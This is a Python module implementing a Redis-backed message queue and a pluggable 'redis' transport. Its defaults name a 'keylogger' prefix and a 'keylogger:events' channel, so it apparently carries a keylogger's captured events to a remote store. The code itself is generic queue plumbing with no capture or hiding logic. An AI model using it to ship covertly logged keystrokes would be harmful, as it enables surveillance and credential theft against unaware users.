"""
Redis message queue system for persistent message storage and distribution.

Provides Redis-based pub/sub for real-time message distribution and persistent
queues for offline message storage. Supports priority-based message handling.
"""

from __future__ import annotations

import asyncio
import base64
import json
import logging
import secrets
import threading
import time
from collections import deque
from enum import Enum
from typing import Any, Union

import redis
from redis.asyncio import Redis
from transport import register_transport
from transport.base import BaseTransport

logger = logging.getLogger(__name__)


class MessagePriority(Enum):
    """Message priority levels."""

    HIGH = "high"
    NORMAL = "normal"
    LOW = "low"


class Message:
    """Message structure for queue operations."""

    def __init__(
        self,
        message_id: str,
        data: Union[str, bytes, dict[str, Any]],
        priority: MessagePriority = MessagePriority.NORMAL,
        ttl: int = 3600,
        metadata: dict[str, Any] | None = None,
    ):
        self.message_id = message_id
        self.data = data
        self.priority = priority
        self.ttl = ttl
        self.metadata = metadata or {}
        self.timestamp = time.time()
        self.attempts = 0
        self.max_attempts = 3

    def to_dict(self) -> dict[str, Any]:
        """Convert message to dictionary for storage."""
        return {
            "message_id": self.message_id,
            "data": self.data,
            "priority": self.priority.value,
            "ttl": self.ttl,
            "metadata": self.metadata,
            "timestamp": self.timestamp,
            "attempts": self.attempts,
            "max_attempts": self.max_attempts,
        }

    @classmethod
    def from_dict(cls, data: dict[str, Any]) -> Message:
        """Create message from dictionary."""
        msg = cls(
            message_id=data["message_id"],
            data=data["data"],
            priority=MessagePriority(data["priority"]),
            ttl=data["ttl"],
            metadata=data.get("metadata", {}),
        )
        msg.timestamp = data.get("timestamp", msg.timestamp)
        msg.attempts = data.get("attempts", 0)
        msg.max_attempts = data.get("max_attempts", 3)
        return msg


class RedisQueue:
    """Redis-based message queue with pub/sub support."""

    def __init__(
        self,
        redis_url: str = "redis://localhost:6379",
        queue_prefix: str = "keylogger",
        default_ttl: int = 3600,
    ):
        self.redis_url = redis_url
        self.queue_prefix = queue_prefix
        self.default_ttl = default_ttl
        self._redis: Redis | None = None
        self._initialized = False

    async def initialize(self) -> None:
        """Initialize Redis connection."""
        if self._initialized:
            return

        try:
            self._redis = Redis.from_url(self.redis_url, decode_responses=True)
            await self._redis.ping()
            self._initialized = True
            logger.info(f"Redis queue initialized: {self.redis_url}")

        except Exception as e:
            logger.error(f"Failed to initialize Redis queue: {e}")
            raise

    async def publish(self, channel: str, message: Message) -> bool:
        """Publish message to Redis channel."""
        if not self._initialized:
            await self.initialize()

        try:
            channel_key = f"{self.queue_prefix}:channel:{channel}"
            message_data = {
                "channel": channel,
                "message": message.to_dict(),
                "timestamp": time.time(),
            }

            # Publish to channel
            await self._redis.publish(channel_key, json.dumps(message_data))

            # Add to persistent queue with per-message expiry as the score
            if message.ttl > 0:
                queue_key = f"{self.queue_prefix}:queue:{channel}"
                expiry = message.timestamp + message.ttl
                await self._redis.zadd(queue_key, {json.dumps(message_data): expiry})
                # Remove expired entries
                now = time.time()
                await self._redis.zremrangebyscore(queue_key, "-inf", now)

            logger.debug(f"Published message to channel {channel}")
            return True

        except Exception as e:
            logger.error(f"Failed to publish message to {channel}: {e}")
            return False

    async def subscribe(self, channel: str) -> Any:
        """Subscribe to Redis channel."""
        if not self._initialized:
            await self.initialize()

        try:
            channel_key = f"{self.queue_prefix}:channel:{channel}"
            pubsub = self._redis.pubsub()
            await pubsub.subscribe(channel_key)

            logger.info(f"Subscribed to channel: {channel}")
            return pubsub

        except Exception as e:
            logger.error(f"Failed to subscribe to {channel}: {e}")
            raise

    async def get_pending(self, channel: str, limit: int = 100) -> list[Message]:
        """Get pending messages from queue."""
        if not self._initialized:
            await self.initialize()

        try:
            queue_key = f"{self.queue_prefix}:queue:{channel}"

            # Prune expired entries before fetching
            now = time.time()
            await self._redis.zremrangebyscore(queue_key, "-inf", now)

            # Get messages with scores (expiry timestamps)
            messages = await self._redis.zrange(queue_key, 0, limit - 1, withscores=True)

            result = []
            for msg_data, expiry_score in messages:
                try:
                    message_dict = json.loads(msg_data)
                    message = Message.from_dict(message_dict["message"])
                    # Do NOT overwrite message.timestamp with the expiry score;
                    # from_dict already restores the original timestamp.
                    result.append(message)
                except Exception as e:
                    logger.error(f"Failed to parse message: {e}")
                    continue

            logger.debug(f"Retrieved {len(result)} pending messages from {channel}")
            return result

        except Exception as e:
            logger.error(f"Failed to get pending messages from {channel}: {e}")
            return []

    async def acknowledge(self, channel: str, message_id: str) -> bool:
        """Acknowledge message processing (remove from queue)."""
        if not self._initialized:
            await self.initialize()

        try:
            queue_key = f"{self.queue_prefix}:queue:{channel}"

            # Scan sorted-set members to find the one matching message_id
            members = await self._redis.zrange(queue_key, 0, -1)
            removed = False
            for member in members:
                try:
                    member_data = json.loads(member)
                    if member_data.get("message", {}).get("message_id") == message_id:
                        await self._redis.zrem(queue_key, member)
                        removed = True
                        break
                except (json.JSONDecodeError, TypeError):
                    continue

            if removed:
                logger.debug(f"Acknowledged message {message_id} on {channel}")
            else:
                logger.warning(f"Message {message_id} not found in queue {channel}")

            return removed

        except Exception as e:
            logger.error(f"Failed to acknowledge message {message_id}: {e}")
            return False

    async def close(self) -> None:
        """Close Redis connection."""
        if self._redis:
            await self._redis.close()
            self._redis = None
            self._initialized = False
            logger.info("Redis queue closed")


@register_transport("redis")
class RedisTransport(BaseTransport):
    """Redis transport for pub/sub message distribution."""

    def __init__(self, config: dict[str, Any]) -> None:
        super().__init__(config)
        self._redis_url = config.get("url", "redis://localhost:6379")
        self._channel = config.get("channel", "keylogger:events")
        self._queue = RedisQueue(
            redis_url=self._redis_url,
            queue_prefix=config.get("queue_prefix", "keylogger"),
            default_ttl=config.get("default_ttl", 3600),
        )
        self._connected = False
        self._pubsub: Any | None = None

        # Event loop for async operations
        self._loop: asyncio.AbstractEventLoop | None = None
        self._thread: threading.Thread | None = None

    def _cleanup_loop_and_thread(self) -> None:
        """Stop the event loop and join the background thread (idempotent)."""
        loop = self._loop
        thread = self._thread
        if loop:
            try:
                loop.call_soon_threadsafe(loop.stop)
            except RuntimeError:
                pass  # loop already closed
        if thread:
            thread.join(timeout=5.0)
        self._loop = None
        self._thread = None

    def connect(self) -> None:
        """Connect to Redis and subscribe to channel."""
        if self._connected:
            return

        # Clean up any previous loop/thread to avoid resource leaks on reconnect
        self._cleanup_loop_and_thread()

        # Start async event loop in separate thread
        self._loop = asyncio.new_event_loop()
        self._thread = threading.Thread(target=self._run_async_loop, daemon=True)
        self._thread.start()

        # Wait for connection
        timeout = 10.0
        start_time = time.time()
        while not self._connected and time.time() - start_time < timeout:
            time.sleep(0.1)

        if not self._connected:
            # Clean up the loop/thread before raising
            self._cleanup_loop_and_thread()
            raise ConnectionError(f"Failed to connect to Redis: {self._redis_url}")

        logger.info(f"Redis transport connected to {self._channel}")

    def _run_async_loop(self) -> None:
        """Run async event loop in separate thread."""
        asyncio.set_event_loop(self._loop)
        try:
            self._loop.run_until_complete(self._async_connect())
            # Only enter run_forever if connection succeeded
            if not self._connected:
                logger.warning("Redis _async_connect failed; skipping run_forever")
                return
            self._loop.run_forever()
        except Exception as e:
            logger.error(f"Redis async loop failed: {e}")
            self._connected = False
        finally:
            try:
                self._loop.stop()
                self._loop.close()
            except Exception:
                pass

    async def _async_connect(self) -> None:
        """Async connection handler."""
        try:
            await self._queue.initialize()
            self._pubsub = await self._queue.subscribe(self._channel)
            self._connected = True
            logger.info(f"Redis transport connected to {self._channel}")

        except Exception as e:
            logger.error(f"Failed to connect Redis transport: {e}")
            self._connected = False
            raise

    def disconnect(self) -> None:
        """Disconnect from Redis."""
        if not self._connected:
            return

        try:
            if self._loop:
                future = asyncio.run_coroutine_threadsafe(self._queue.close(), self._loop)
                future.result(timeout=5.0)
            logger.info("Redis transport disconnected")
        except Exception as e:
            logger.error(f"Error disconnecting Redis transport: {e}")
        finally:
            self._connected = False
            self._pubsub = None
            self._cleanup_loop_and_thread()

    def send(self, data: bytes, metadata: dict[str, Any] | None = None) -> bool:
        """Send data via Redis pub/sub."""
        if not self._connected or not self._loop:
            self.connect()

        if not self._connected or not self._loop:
            return False

        try:
            if metadata is None:
                metadata = {}

            message_id = f"msg_{int(time.time() * 1000)}_{secrets.token_hex(8)}"

            # Handle binary data safely
            if isinstance(data, bytes):
                try:
                    data_str = data.decode("utf-8")
                except UnicodeDecodeError:
                    data_str = base64.b64encode(data).decode("ascii")
                    metadata["encoding"] = "base64"
            else:
                data_str = data

            message = Message(
                message_id=message_id,
                data=data_str,
                priority=MessagePriority.NORMAL,
                ttl=3600,  # 1 hour
                metadata=metadata,
            )

            # Send message using event loop
            future = asyncio.run_coroutine_threadsafe(
                self._queue.publish(self._channel, message), self._loop
            )
            success = future.result(timeout=10.0)

            if success:
                logger.debug(f"Sent message {message_id} via Redis")

            return success

        except Exception as e:
            logger.error(f"Failed to send message via Redis: {e}")
            return False

    def get_pending_messages(self, limit: int = 100) -> list[tuple[bytes, dict[str, Any]]]:
        """Get pending messages from Redis queue."""
        if not self._connected or not self._loop:
            self.connect()

        try:
            future = asyncio.run_coroutine_threadsafe(
                self._queue.get_pending(self._channel, limit), self._loop
            )
            messages = future.result(timeout=10.0)

            result = []
            for msg in messages:
                # Reverse base64 encoding if applied during send
                if isinstance(msg.data, str) and msg.metadata.get("encoding") == "base64":
                    raw = base64.b64decode(msg.data)
                elif isinstance(msg.data, str):
                    raw = msg.data.encode()
                else:
                    raw = msg.data
                result.append((raw, msg.metadata))

            return result

        except Exception as e:
            logger.error(f"Failed to get pending messages: {e}")
            return []

    def acknowledge_message(self, message_id: str) -> bool:
        """Acknowledge message processing."""
        if not self._connected or not self._loop:
            return False

        try:
            future = asyncio.run_coroutine_threadsafe(
                self._queue.acknowledge(self._channel, message_id), self._loop
            )
            return future.result(timeout=5.0)

        except Exception as e:
            logger.error(f"Failed to acknowledge message {message_id}: {e}")
            return False
